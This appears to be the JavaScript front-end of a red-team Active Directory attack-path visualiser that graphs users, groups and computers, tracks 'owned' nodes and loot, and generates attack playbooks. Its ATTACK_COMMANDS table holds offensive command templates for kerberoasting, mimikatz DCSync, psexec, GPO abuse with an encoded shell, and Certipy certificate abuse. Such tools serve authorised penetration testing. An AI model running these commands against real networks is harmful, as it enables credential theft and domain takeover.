let cy;
let selectedNodeId = null;
let searchHistory = [];
let isolatedHidden = false;
let topPanelZIndex = 2000;

// 🎯 Mapping AD Concepts to Red Team Commands
const ATTACK_COMMANDS = {
    "MemberOf": "No exploit needed. You are a member of this group by design. Inherit permissions.",
    "AdminTo": "psexec.py {domain}/{user}@{target} -k -no-pass",
    "GenericAll": "AddMember: net group \"{target}\" {user} /add /domain\nOR\nForcePwd: Rubeus.exe changepw /ticket:{ticket} /new:Password123 /targetuser:{target}",
    "WriteDacl": "PowerView: Add-DomainObjectAcl -TargetIdentity {target} -PrincipalIdentity {user} -Rights All",
    "WriteOwner": "Set-DomainObjectOwner -Identity {target} -OwnerIdentity {user}",
    "Kerberoastable": "Rubeus.exe kerberoast /user:{target} /simple /nowrap",
    "ASREPRoastable": "Rubeus.exe asreproast /user:{target} /format:hashcat /nowrap",
    "DCSync": "mimikatz.exe \"lsadump::dcsync /domain:{domain} /user:{target}\"",
    "AllExtendedRights": "Generic All Extended Rights - dependent on object type. Inspect with BloodHound.",
    "ForceChangePassword": "net user {target} NewPassword123! /domain",
    "AddMember": "net group \"{target}\" {user} /add /domain",
    "GPLink": "GPO Link - Policies apply to this OU/Domain. Explore for insecure GPOs linked here.",
    "EditGPO": "New-GPOImmediateTask -TaskName \"ShieldsDown\" -Command \"powershell.exe\" -CommandArguments \"-enc <BASE64_SHELL>\" -GPO \"{target}\"\nOR\nSharpGPOAbuse.exe --add-localadmin --user {user} --gponame \"{target}\"",
    "Enroll": "certipy-ad req -u {user} -p {pass} -target {target} -template {template} -ca {ca} -dc-ip {dc_ip}",
    "WriteCertAny": "Certificate Injection: certipy-ad shadow auto -u {user} -p {pass} -account {target}",
    "AllIssuancePolicy": "Certificate Template Misconfiguration: Use Certipy to request a certificate with SAN on behalf of other users."
};

document.addEventListener('DOMContentLoaded', function () {
    // 🔀 Panel Stacking Logic
    ['sidebarPanel', 'propertiesPanel', 'playbookPanel', 'topDashboard'].forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            el.addEventListener('mousedown', () => bringPanelToFront(id));
        }
    });

    // 🖱️ Global Context Menu Dismissal (Outside Canvas)
    document.addEventListener('mousedown', function (e) {
        const menu = document.getElementById('ctxMenu');
        // Close if click is NOT inside the menu
        if (menu && menu.style.display === 'block' && !menu.contains(e.target)) {
            hideCtxMenu();
        }
    });

    document.fonts.ready.then(function () {
        initCy();
    });
});

// Helper to determine node label with icons
function getNodeLabel(ele) {
    const type = ele.data('type');
    const subtype = ele.data('subtype');
    let icon = '';

    if (type === 'User') icon = '\uf007 ';
    else if (type === 'Group') icon = '\uf0c0 ';
    else if (type === 'Computer' && subtype === 'DC') icon = '\uf233 ';
    else if (type === 'Computer' && subtype === 'Workstation') icon = '\uf109 ';
    else if (type === 'Computer') icon = '\uf108 ';
    else if (type === 'Domain') icon = '\uf0e8 ';
    else if (type === 'GPO' || type === 'GPCore') icon = '\uf15c ';
    else if (type === 'CertificateAuthority') icon = '\uf0a3 ';

    let label = icon + (ele.data('label') || ele.id());
    if (ele.data('has_loot') === 'true') label = '💰 ' + label;
    if (ele.data('has_notes') === 'true') label = '📝 ' + label;
    return label;
}

function bringPanelToFront(panelId) {
    const panel = document.getElementById(panelId);
    if (!panel) return;
    topPanelZIndex++;
    panel.style.zIndex = topPanelZIndex;
}

function initCy() {
    fetch('/api/graph')
        .then(res => res.json())
        .then(elements => {
            cy = cytoscape({
                container: document.getElementById('cy'),
                elements: elements,
                style: [
                    {
                        selector: 'node',
                        style: {
                            'font-family': '"Font Awesome 6 Free", "Inter", sans-serif',
                            'font-weight': 900,
                            'label': function (ele) { return getNodeLabel(ele); },
                            'color': '#cbd5e1',
                            'text-valign': 'bottom',
                            'text-halign': 'center',
                            'font-size': '10px',
                            'text-margin-y': 5,
                            'background-opacity': 1,
                            'text-background-opacity': 0
                        }
                    },
                    {
                        selector: 'node[type="User"]',
                        style: {
                            'shape': 'ellipse',
                            'background-color': '#3b82f6'
                        }
                    },
                    {
                        selector: 'node[type="Group"]',
                        style: {
                            'shape': 'diamond',
                            'background-color': '#8b5cf6'
                        }
                    },
                    {
                        selector: 'node[type="Computer"]',
                        style: {
                            'shape': 'round-rectangle',
                            'background-color': '#64748b'
                        }
                    },
                    {
                        selector: 'node[subtype="DC"]',
                        style: {
                            'background-color': '#475569',
                            'border-width': 2,
                            'border-color': '#fbbf24'
                        }
                    },
                    {
                        selector: 'node[type="Domain"]',
                        style: {
                            'shape': 'triangle',
                            'background-color': '#10b981'
                        }
                    },
                    {
                        selector: 'node[type="GPO"], node[type="GPCore"]',
                        style: {
                            'shape': 'rectangle',
                            'background-color': '#10b981'
                        }
                    },
                    {
                        selector: 'node[type="CertificateAuthority"]',
                        style: {
                            'shape': 'hexagon',
                            'background-color': '#f59e0b'
                        }
                    },
                    {
                        selector: 'node[owned = "true"]',
                        style: {
                            'background-color': '#ef4444',
                            'shadow-blur': 15,
                            'shadow-color': '#ef4444'
                        }
                    },
                    {
                        selector: ':selected',
                        style: {
                            'border-width': 2,
                            'border-color': '#fff'
                        }
                    },
                    {
                        selector: 'edge',
                        style: {
                            'width': 1.5,
                            'line-color': '#334155',
                            'target-arrow-color': '#334155',
                            'target-arrow-shape': 'triangle',
                            'curve-style': 'bezier',
                            'label': 'data(relationship)',
                            'font-size': '9px',
                            'color': '#64748b',
                            'text-rotation': 'autorotate',
                            'text-background-color': '#0f172a',
                            'text-background-opacity': 1,
                            'text-background-padding': '2px'
                        }
                    },
                    {
                        selector: '.tooltip-focal',
                        style: {
                            // Retains original type shape and color
                            'border-width': 6,
                            'border-color': '#facc15', // Radiant yellow border
                            'z-index': 10000,
                            'label': function (ele) { return getNodeLabel(ele); },
                            'color': '#facc15',
                            'font-family': '"Font Awesome 6 Free", "Inter", sans-serif',
                            'font-weight': 900,
                            'font-size': '13px', // Slightly larger for emphasis
                            'text-valign': 'bottom',
                            'text-halign': 'center',
                            'text-margin-y': 10,
                            'text-background-opacity': 0.8, // Slight background for label readability
                            'text-background-color': '#0f172a',
                            'text-background-padding': '4px',
                            'text-background-shape': 'round-rectangle',
                            'text-opacity': 1,
                            'text-events': 'yes'
                        }
                    },
                    {
                        selector: 'edge.highlighted',
                        style: {
                            'line-color': '#eab308',
                            'target-arrow-color': '#eab308',
                            'width': 4,
                            'z-index': 9999
                        }
                    },
                    {
                        selector: 'edge.blast-highlight',
                        style: {
                            'line-color': '#f97316',
                            'target-arrow-color': '#f97316',
                            'width': 3,
                            'z-index': 999
                        }
                    }
                ],
                layout: {
                    name: 'dagre',
                    rankDir: 'LR',
                    nodeSep: 80,
                    rankSep: 150,
                    padding: 40,
                    spacingFactor: 1.2
                }
            });

            // Re-alignment logic support for High Value targets
            cy.nodes('[highvalue = "true"]').style({
                'border-width': 3,
                'border-color': '#fbbf24',
                'shadow-blur': 10,
                'shadow-color': '#fbbf24'
            });

            // Context Menu
            cy.on('cxttap', 'node', function (evt) {
                let node = evt.target;
                selectedNodeId = node.id();
                showCtxMenu(evt.originalEvent.clientX, evt.originalEvent.clientY);
            });

            // Dismiss menu on any background interaction (mousedown, drag, scroll)
            cy.on('mousedown dragstart scroll zoom', function (evt) {
                if (evt.target === cy || evt.target.isEdge?.()) {
                    hideCtxMenu();
                    selectedNodeId = null;
                }
            });

            // Auto Select on click
            cy.on('tap', 'node', function (evt) {
                let node = evt.target;
                selectedNodeId = node.id();
                showProperties(selectedNodeId);
            });

            // Update stats after initial population
            updateSessionStats();
            fetchEnvironmentSummary();
        });
}

function showToast(message, type = "info") {
    let container = document.getElementById("notification-container");
    if (!container) return;

    let icon = "circle-info";
    let title = "SYSTEM MESSAGE";

    if (type === "success") { icon = "circle-check"; title = "ACTION SUCCESSFUL"; }
    if (type === "error") { icon = "circle-exclamation"; title = "OPERATION FAILED"; }
    if (type === "warning") { icon = "triangle-exclamation"; title = "SECURITY ALERT"; }

    const notif = document.createElement("div");
    notif.className = `notif-card ${type}`;
    notif.innerHTML = `
        <i class="fa-solid fa-${icon} notif-icon"></i>
        <div class="notif-content">
            <span class="notif-title">${title}</span>
            <span class="notif-message">${message}</span>
        </div>
        <button class="notif-close"><i class="fa-solid fa-xmark"></i></button>
    `;

    // Close Handler
    notif.querySelector('.notif-close').onclick = () => {
        notif.classList.add('closing');
        setTimeout(() => notif.remove(), 300);
    };

    container.appendChild(notif);

    // Auto Dismiss
    setTimeout(() => {
        if (document.body.contains(notif)) {
            notif.classList.add('closing');
            setTimeout(() => notif.remove(), 300);
        }
    }, 4500);
}

// Playbook Functions
function openPlaybook(pathIds) {
    let panel = document.getElementById('playbookPanel');
    bringPanelToFront('playbookPanel');
    let content = document.getElementById('playbookContent');
    content.innerHTML = "";

    panel.classList.add('open');

    if (pathIds.length < 2) {
        content.innerHTML = "<p>Path too short.</p>";
        return;
    }

    // Generate Steps
    let html = "";
    for (let i = 0; i < pathIds.length - 1; i++) {
        let u = pathIds[i];
        let v = pathIds[i + 1];
        let edge = cy.edges(`[source="${u}"][target="${v}"]`).first();

        if (edge) {
            let rel = edge.data('relationship');
            let cmdTemplate = ATTACK_COMMANDS[rel] || "Consult Red Team Manual for " + rel;

            // Simple variable replacement
            let cmd = cmdTemplate
                .replace(/{target}/g, v)
                .replace(/{user}/g, u)
                .replace(/{domain}/g, "CORP.LOCAL");

            html += `
                <div class="command-block">
                    <span class="cmd-title">STEP ${i + 1}: ${u} &rarr; ${v} [${rel}]</span>
                    <span class="cmd-text">${cmd}</span>
                </div>
             `;
        }
    }
    content.innerHTML = html;
}

function closePlaybook() {
    document.getElementById('playbookPanel').classList.remove('open');
}

function showProperties(nodeId) {
    const node = cy.$id(nodeId);
    if (!node || node.length === 0) return;

    const data = node.data();
    const panel = document.getElementById('propertiesPanel');
    bringPanelToFront('propertiesPanel');
    const content = document.getElementById('propertiesContent');

    // Build properties HTML
    let html = `
        <div class="prop-section">
            <div class="prop-section-title"><i class="fa-solid fa-tag"></i> Basic Information</div>
            <div class="prop-row">
                <span class="prop-label">Object ID</span>
                <span class="prop-value">${data.id}</span>
            </div>
            <div class="prop-row">
                <span class="prop-label">Display Name</span>
                <span class="prop-value">${data.label || 'N/A'}</span>
            </div>
            <div class="prop-row">
                <span class="prop-label">Object Type</span>
                <span class="prop-value"><span class="prop-badge badge-${data.type.toLowerCase()}">${data.type}</span></span>
            </div>
            ${data.subtype && data.subtype !== 'Generic' ? `
            <div class="prop-row">
                <span class="prop-label">Subtype</span>
                <span class="prop-value">${data.subtype}</span>
            </div>
            ` : ''}
            ${data.type === 'Computer' ? `
            <div class="prop-row">
                <span class="prop-label">IP Address</span>
                <span class="prop-value">${data.ipaddress || '10.0.0.' + Math.floor(Math.random() * 254 + 1)}</span>
            </div>
            <div class="prop-row">
                <span class="prop-label">Operating System</span>
                <span class="prop-value">${data.operatingsystem || 'Windows Server 2019'}</span>
            </div>
            ` : ''}
            <div class="prop-row">
                <span class="prop-label">Domain</span>
                <span class="prop-value">${data.domain || 'CORP.LOCAL'}</span>
            </div>
        </div>
        
        <div class="prop-section">
            <div class="prop-section-title"><i class="fa-solid fa-key"></i> Privilege Summary</div>
            <div class="prop-row">
                <span class="prop-label">Local Admin</span>
                <span class="prop-value">${data.local_admin ? '<span style="color:var(--success)">YES</span>' : 'NO'}</span>
            </div>
            <div class="prop-row">
                <span class="prop-label">Delegation</span>
                <span class="prop-value">${data.delegation || 'None'}</span>
            </div>
            <div class="prop-row">
                <span class="prop-label">Active Sessions</span>
                <span class="prop-value">${data.sessions || '0'}</span>
            </div>
            <div class="prop-row">
                <span class="prop-label">High Value</span>
                <span class="prop-value">${data.highvalue === 'true' ? '<span class="prop-badge badge-highvalue">YES</span>' : 'NO'}</span>
            </div>
        </div>

        <div class="prop-section">
            <div class="prop-section-title"><i class="fa-solid fa-shield"></i> Security Status</div>
            <div class="prop-row">
                <span class="prop-label">Compromised</span>
                <span class="prop-value">${data.owned === 'true' ? '<span class="prop-badge badge-owned">YES</span>' : '<span class="prop-badge">NO</span>'}</span>
            </div>
            <div class="prop-row">
                <span class="prop-label">Incoming Paths</span>
                <span class="prop-value">${node.indegree()}</span>
            </div>
            <div class="prop-row">
                <span class="prop-label">Outgoing Paths</span>
                <span class="prop-value">${node.outdegree()}</span>
            </div>
        </div>
        
        
        <div class="prop-section">
            <div class="prop-section-title"><i class="fa-solid fa-crosshairs"></i> Attack Vectors</div>
            ${generateAttackVectors(node)}
        </div>
    `;

    content.innerHTML = html;
    panel.classList.add('open');

    // Load Loot and Notes
    document.getElementById('propActions').style.display = 'block';
    loadNodeDetails(nodeId);
}

function loadNodeDetails(nodeId) {
    if (!nodeId) return;
    fetch(`/api/get_node_details/${encodeURIComponent(nodeId)}`)
        .then(res => res.json())
        .then(data => {
            document.getElementById('nodeNotes').value = data.notes || "";
            document.getElementById('nodeLoot').value = data.loot || "";
        })
        .catch(err => console.error("Error loading details:", err));
}

function saveNodeDetails() {
    // If saving specifically for the currently viewed node properties
    if (!selectedNodeId) return;

    const notes = document.getElementById('nodeNotes').value;
    const loot = document.getElementById('nodeLoot').value;

    fetch('/api/update_node_details', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            node: selectedNodeId,
            notes: notes,
            loot: loot
        })
    })
        .then(res => res.json())
        .then(data => {
            if (data.status === 'success') {
                showToast("Details saved!");
                // Update node data locally to refresh label if needed
                const node = cy.$id(selectedNodeId);
                node.data('has_loot', loot.trim() ? 'true' : 'false');
                node.data('has_notes', notes.trim() ? 'true' : 'false');
                updateSessionStats();
            }
        });
}

function generateAttackVectors(node) {
    const edges = node.connectedEdges();
    const outgoing = edges.filter(e => e.source().id() === node.id());

    if (outgoing.length === 0) {
        return '<div class="prop-row"><span class="prop-label">No outgoing attack paths</span></div>';
    }

    let html = '';
    const uniqueRels = new Set();

    outgoing.forEach(edge => {
        const rel = edge.data('relationship');
        if (!uniqueRels.has(rel)) {
            uniqueRels.add(rel);
            const targetNode = edge.target();
            html += `
                <div class="prop-row">
                    <span class="prop-label">${rel}</span>
                    <span class="prop-value">${targetNode.data('label')}</span>
                </div>
            `;
        }
    });

    return html || '<div class="prop-row"><span class="prop-label">No attack vectors</span></div>';
}

function closeProperties() {
    document.getElementById('propertiesPanel').classList.remove('open');
}


function showCtxMenu(x, y) {
    const menu = document.getElementById('ctxMenu');
    const node = cy.$id(selectedNodeId);

    if (!node || node.length === 0) return;

    const isOwned = node.data('owned') === 'true';

    // Build dynamic menu with only 4 options
    menu.innerHTML = `
        <div class="ctx-item" onclick="handleCtx('${isOwned ? 'unowned' : 'owned'}')">
            <i class="fa-solid fa-${isOwned ? 'shield' : 'skull'}"></i> ${isOwned ? 'Unmark as Owned' : 'Mark as Owned'}
        </div>
        <div class="ctx-item" onclick="handleCtx('source')">
            <i class="fa-solid fa-plane-departure"></i> Set as Source
        </div>
        <div class="ctx-item" onclick="handleCtx('target')">
            <i class="fa-solid fa-bullseye"></i> Set as Target
        </div>
        <div class="ctx-item" onclick="handleCtx('impact')">
            <i class="fa-solid fa-radiation"></i> Impact Analysis
        </div>
        <div class="ctx-item" onclick="handleCtx('properties')">
            <i class="fa-solid fa-info-circle"></i> Show Properties
        </div>
    `;

    menu.style.display = 'block';
    menu.style.left = x + 'px';
    menu.style.top = y + 'px';
}

function hideCtxMenu() {
    document.getElementById('ctxMenu').style.display = 'none';
}

function handleCtx(action) {
    hideCtxMenu();
    if (!selectedNodeId) return;

    if (action === 'owned') {
        markOwned(selectedNodeId);
    } else if (action === 'unowned') {
        unmarkOwned(selectedNodeId);
    } else if (action === 'source') {
        document.getElementById('sourceInp').value = selectedNodeId;
        showToast(`Source set to ${selectedNodeId}`);
    } else if (action === 'target') {
        document.getElementById('targetInp').value = selectedNodeId;
        showToast(`Target set to ${selectedNodeId}`);
    } else if (action === 'impact') {
        showImpactAnalysis(selectedNodeId);
    } else if (action === 'properties') {
        showProperties(selectedNodeId);
    }
}

function addToSearchHistory(nodeId) {
    if (!searchHistory.includes(nodeId)) {
        searchHistory.unshift(nodeId);
        if (searchHistory.length > 5) searchHistory.pop();
    }
}

function showImpactAnalysis(nodeId) {
    const startNode = cy.$id(nodeId);
    if (!startNode) return;

    // Independent: ONLY clear blast highlights, not path highlights
    cy.elements().removeClass('blast-highlight');

    // BFS traversal to find all reachable nodes
    const collection = cy.collection();
    cy.elements().bfs({
        roots: startNode,
        visit: function (v, e, u, i, depth) {
            collection.merge(v);
            if (e) collection.merge(e);
        },
        directed: true
    });

    collection.addClass('blast-highlight');
    const reachableCount = collection.nodes().length - 1;
    const privCount = collection.nodes('[highvalue = "true"]').length;

    // Show clear button
    document.getElementById('btnClearImpact').style.display = 'flex';

    showToast(`Impact Analysis: ${reachableCount} reachable nodes (${privCount} privileged)`, "success");
}

function clearImpactAnalysis() {
    cy.elements().removeClass('blast-highlight');
    document.getElementById('btnClearImpact').style.display = 'none';
    showToast("Impact Analysis Cleared");
}

// Quick filter functionality removed as per user request

function fetchEnvironmentSummary() {
    fetch('/api/summary')
        .then(res => res.json())
        .then(data => {
            document.getElementById('statUsers').innerText = data.total_users;
            document.getElementById('statComputers').innerText = data.total_computers;
            document.getElementById('statAdmins').innerText = data.total_admins;
            document.getElementById('statGPOs').innerText = data.total_gpos;

            // Populate Tooltips
            populateTooltip('listUsers', data.users_list, data.total_users);
            populateTooltip('listComputers', data.computers_list, data.total_computers);
            populateTooltip('listAdmins', data.admins_list, data.total_admins);
            populateTooltip('listGPOs', data.gpos_list, data.total_gpos);
        });
}

function populateTooltip(elementId, items, totalCount) {
    const container = document.getElementById(elementId);
    if (!items || items.length === 0) {
        container.innerHTML = "<div style='padding:8px;color:#94a3b8;font-style:italic;'>No data available</div>";
        return;
    }

    // Infer icon based on category
    let iconClass = 'fa-circle-dot'; // default
    if (elementId.includes('Users')) iconClass = 'fa-user';
    else if (elementId.includes('Computers')) iconClass = 'fa-desktop';
    else if (elementId.includes('Priv')) iconClass = 'fa-shield-halved';
    else if (elementId.includes('Roast')) iconClass = 'fa-fire';

    let html = items.map(item => {
        const safeItem = item.replace(/'/g, "\\'");
        return `<div class="tooltip-item" 
                     onmouseenter="highlightNodeStyleOnly('${safeItem}')" 
                     onmouseleave="clearTooltipHighlight()" 
                     onclick="focusNodeFromTooltip('${safeItem}')">
                     <i class="fa-solid ${iconClass}" style="margin-right: 8px; opacity: 0.7; font-size: 0.8em;"></i>
                     ${item}
                </div>`;
    }).join('');

    if (totalCount > items.length) {
        html += `<div class="tooltip-more">+ ${totalCount - items.length} more...</div>`;
    }
    container.innerHTML = html;
}

function toggleDashTooltip(element, event) {
    if (event) event.stopPropagation();
    const tooltip = element.querySelector('.dash-tooltip');
    const isVisible = tooltip.classList.contains('visible');

    // Close all other tooltips first
    document.querySelectorAll('.dash-tooltip').forEach(tt => tt.classList.remove('visible'));

    // Toggle current
    if (!isVisible) {
        tooltip.classList.add('visible');
    }
}

// Add global listener to close tooltips when clicking outside
document.addEventListener('click', () => {
    document.querySelectorAll('.dash-tooltip').forEach(tt => tt.classList.remove('visible'));
});

function highlightNodeStyleOnly(nodeId) {
    if (!cy) return;
    let node = cy.$id(nodeId);
    if (node.length === 0) {
        node = cy.nodes().filter(n => n.id().toLowerCase() === nodeId.toLowerCase() || n.data('label') === nodeId);
    }
    if (node.length > 0) {
        cy.elements().removeClass('tooltip-focal');
        node.addClass('tooltip-focal');
        node.style('z-index', 10000);
    }
}

function focusNodeFromTooltip(nodeId) {
    if (!cy) return;
    let node = cy.$id(nodeId);
    if (node.length === 0) {
        node = cy.nodes().filter(n => n.id().toLowerCase() === nodeId.toLowerCase() || n.data('label') === nodeId);
    }
    if (node.length > 0) {
        cy.animate({
            center: { eles: node },
            zoom: 1.2,
            duration: 400
        });

        // Auto-select and show properties
        selectedNodeId = node.id();
        node.select();
        showProperties(selectedNodeId);
    }
}

function clearTooltipHighlight() {
    cy.elements().removeClass('tooltip-focal');
}

function setAsSource() {
    let selected = cy.$(':selected');
    if (selected.length > 0 && selected.isNode()) {
        let id = selected.id();
        document.getElementById('sourceInp').value = id;
        showToast(`Source set to ${id}`);
    } else {
        showToast("Please select a node on the graph first", "error");
    }
}

function setAsTarget() {
    let selected = cy.$(':selected');
    if (selected.length > 0 && selected.isNode()) {
        let id = selected.id();
        document.getElementById('targetInp').value = id;
        showToast(`Target set to ${id}`);
    } else {
        showToast("Please select a node on the graph first", "error");
    }
}

function useOwnedAsSource() {
    document.getElementById('sourceInp').value = "OWNED";
    showToast("Starting from ALL Owned Nodes");
}

function markOwned(nodeId) {
    fetch('/api/mark_owned', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ node: nodeId })
    })
        .then(res => res.json())
        .then(data => {
            if (data.status === 'success') {
                cy.$id(nodeId).data('owned', 'true');
                cy.$id(nodeId).style({ 'background-color': '#ef4444' });
                showToast(`${nodeId} compromised!`, "success");
                updateSessionStats();
            } else {
                showToast(data.error, "error");
            }
        });
}

function unmarkOwned(nodeId) {
    fetch('/api/unmark_owned', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ node: nodeId })
    })
        .then(res => res.json())
        .then(data => {
            if (data.status === 'success') {
                cy.$id(nodeId).data('owned', 'false');
                cy.$id(nodeId).removeStyle('background-color');
                showToast(`${nodeId} unmarked`, "success");
                updateSessionStats();
            } else {
                showToast(data.error, "error");
            }
        });
}

function clearOwned() {
    fetch('/api/reset_owned', { method: 'POST' })
        .then(() => {
            cy.nodes().data('owned', 'false');
            cy.nodes().data('has_loot', 'false');
            cy.nodes().data('has_notes', 'false');
            cy.nodes().removeStyle('background-color');
            showToast("Reset all compromised nodes");
            updateSessionStats();
        });
}

function resetGraph() {
    cy.elements().show(); // Ensure everything is visible
    isolatedHidden = false;
    const pruneBtn = document.getElementById('btnPruneIsolated');
    if (pruneBtn) {
        pruneBtn.innerHTML = '<i class="fa-solid fa-eye-slash"></i> Hide Isolated Nodes';
    }
    cy.fit();
    cy.elements().removeClass('highlighted').removeClass('blast-highlight');
    const btn = document.getElementById('btnClearImpact');
    if (btn) btn.style.display = 'none';
    closePlaybook();
    showToast("Graph View Reset");
}

function toggleIsolatedNodes() {
    if (!cy) return;
    // Filter for nodes with no connections AND that aren't High Value or Domain assets
    const isolated = cy.nodes().filter(n => n.degree() === 0 && n.data('highvalue') !== 'true' && n.data('type') !== 'Domain');
    const btn = document.getElementById('btnPruneIsolated');

    if (isolated.length === 0) {
        showToast("No isolated nodes found");
        return;
    }

    if (isolatedHidden) {
        isolated.show();
        btn.innerHTML = '<i class="fa-solid fa-eye-slash"></i> Hide Isolated Nodes';
        showToast(`Revealed ${isolated.length} isolated nodes`);
    } else {
        isolated.hide();
        btn.innerHTML = '<i class="fa-solid fa-eye"></i> Show Isolated Nodes';
        showToast(`Hidden ${isolated.length} isolated nodes`);
    }

    isolatedHidden = !isolatedHidden;
}

function reAlignGraph() {
    const layout = cy.layout({
        name: 'dagre',
        rankDir: 'LR',
        nodeSep: 80,
        rankSep: 150,
        padding: 40,
        spacingFactor: 1.2,
        animate: true,
        animationDuration: 500
    });
    layout.run();
    showToast("Layout Re-aligned");
}

function updateSessionStats() {
    const ownedCount = cy.nodes('[owned = "true"]').length;
    const lootCount = cy.nodes('[has_loot = "true"]').length;

    document.getElementById('ownedCount').innerText = ownedCount;
    document.getElementById('lootCount').innerText = lootCount;
}

function findPath(type) {
    let source = document.getElementById('sourceInp').value;
    let target = document.getElementById('targetInp').value;

    if (!source || !target) {
        showToast("Please select Source and Target", "error");
        return;
    }

    addToSearchHistory(source);
    addToSearchHistory(target);

    // Independent: ONLY clear path highlights, not impact highlights
    cy.elements().removeClass('highlighted');

    let endpoint = type === 'shortest' ? '/api/path/shortest' : '/api/path/easiest';

    fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ source: source, target: target })
    })
        .then(res => {
            if (!res.ok) {
                return res.json().then(err => { throw new Error(err.error || "Server Error"); });
            }
            return res.json();
        })
        .then(data => {
            if (data.found) {
                let pathIds = data.path;
                let edges = cy.collection();
                for (let i = 0; i < pathIds.length - 1; i++) {
                    let u = pathIds[i];
                    let v = pathIds[i + 1];
                    let edge = cy.edges(`[source="${u}"][target="${v}"]`);
                    if (edge.length > 0) edges = edges.union(edge);
                }
                edges.addClass('highlighted');

                // Update Stats
                document.getElementById('pathHops').innerText = `${pathIds.length - 1} HOPS`;

                showToast("Attack Path Identified!", "success");

                // Open Playbook
                openPlaybook(pathIds);

            } else {
                showToast("No attack path exists between these nodes.", "error");
            }
        })
        .catch(err => {
            console.error(err);
            showToast(err.message, "error");
        });
}

// ===== FILE MANAGEMENT SYSTEM =====

function toggleFileDropdown(event) {
    if (event) event.stopPropagation();
    const tooltip = document.getElementById('fileMenu');

    // Close other tooltips
    document.querySelectorAll('.dash-tooltip').forEach(tt => {
        if (tt !== tooltip) tt.classList.remove('visible');
    });

    if (tooltip.classList.contains('visible')) {
        tooltip.classList.remove('visible');
    } else {
        tooltip.style.width = '240px';
        tooltip.style.textAlign = "left";
        tooltip.classList.add('visible');
        loadFileList(); // Refresh list on open
    }
}

function loadFileList() {
    fetch('/api/files')
        .then(res => res.json())
        .then(data => {
            const container = document.getElementById('fileListContainer');
            document.getElementById('currentFileVal').innerText = data.current;

            if (data.files.length === 0) {
                container.innerHTML = "<div style='padding:8px; font-style:italic;'>No files found</div>";
                return;
            }

            let html = '';
            data.files.forEach(file => {
                const isActive = file === data.current;
                const activeStyle = isActive ? 'color: var(--success); font-weight: 700;' : '';
                const activeIcon = isActive ? '<i class="fa-solid fa-check" style="margin-left: auto;"></i>' : '';

                html += `<div class="tooltip-item" onclick="switchFile('${file}')" style="display: flex; align-items: center; ${activeStyle}">
                            <i class="fa-regular fa-file-lines" style="margin-right: 8px; opacity: 0.7;"></i>
                            <span style="flex:1; overflow:hidden; text-overflow:ellipsis;">${file}</span>
                            ${activeIcon}
                         </div>`;
            });
            container.innerHTML = html;
        });
}

function switchFile(filename) {
    // Immediate Switch with Cyber-Scan Loader
    const loader = document.getElementById('loader');
    loader.classList.add('active');
    loader.querySelector('.loading-text').innerText = `ACCESSING ${filename.toUpperCase()}...`;

    fetch('/api/switch_file', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ filename: filename })
    })
        .then(res => res.json())
        .then(data => {
            if (data.status === 'success') {
                loader.querySelector('.loading-text').innerText = "Loading...";
                setTimeout(() => location.reload(), 1000);
            } else {
                loader.classList.remove('active');
                showToast("Failed to load dataset", "error");
            }
        });
}

function handleFileUpload(input) {
    const file = input.files[0];
    if (!file) return;

    const formData = new FormData();
    formData.append('file', file);

    showToast("Uploading...", "info");

    fetch('/api/upload', {
        method: 'POST',
        body: formData
    })
        .then(res => res.json())
        .then(data => {
            if (data.status === 'success') {
                showToast(`File uploaded: ${data.filename}`, "success");
                // Auto switch to new file
                switchFile(data.filename);
            } else {
                showToast(data.error || "Upload failed", "error");
            }
        });
}

// Initial Load
document.addEventListener('DOMContentLoaded', () => {
    loadFileList();
});
